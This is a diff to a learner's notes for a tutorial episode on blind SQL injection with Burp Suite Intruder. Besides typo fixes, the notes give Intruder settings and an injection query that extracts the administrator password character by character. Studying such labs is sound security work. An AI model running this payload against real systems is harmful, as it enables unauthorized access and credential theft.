@@ -94,7 +94,7 @@ Episode11- YouTube Channel AcronProject:
         |   13-4  Attack type = Sniper
         |   13-5  go to Paloads Tab
         |   13-6  Click Payload type = Numers 
-        |   13-7  on Paload Options ---> Number range ---> Type = Sequential
+        |   13-7  on Payloads Options ---> Number range ---> Type = Sequential
         |   13-8  From = 1 
         |   13-9  To   = 50 
         |   13-10 Step = 1
@@ -117,7 +117,7 @@ Episode11- YouTube Channel AcronProject:
         |                                                                                                                                        = if is True = a is first character 
         15- Send in Intruder       
         16- Like 13-1 to 13-11 for "a" 
-        |    16-1 Paload Tab = Brute forcer
+        |    16-1 Payloads Tab = Brute forcer
         |    16-2 Min length = 1
         |    16-3 Max length = 1
         |
@@ -128,6 +128,14 @@ Episode11- YouTube Channel AcronProject:
         18- use this query-:
         |                                                                                                                    $1$                                               $a$
         |    select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select substring(password,$1$,1) from users where username'administrator')='$a$'--'
+        |
+        19- Go to Payloads tab-:
+        |     19-1 Payload set 1 & 2
+        |     19-2 on Payloads Options ---> From = 1 && To = length of reach && step = 1
+        |                               1- axxxxxxxxxx
+        |                               2- adxxxxxxxxx
+        |                               3- adQxxxxxxxx
+        |                               4- adQ7xxxxxxx
         |
 
 
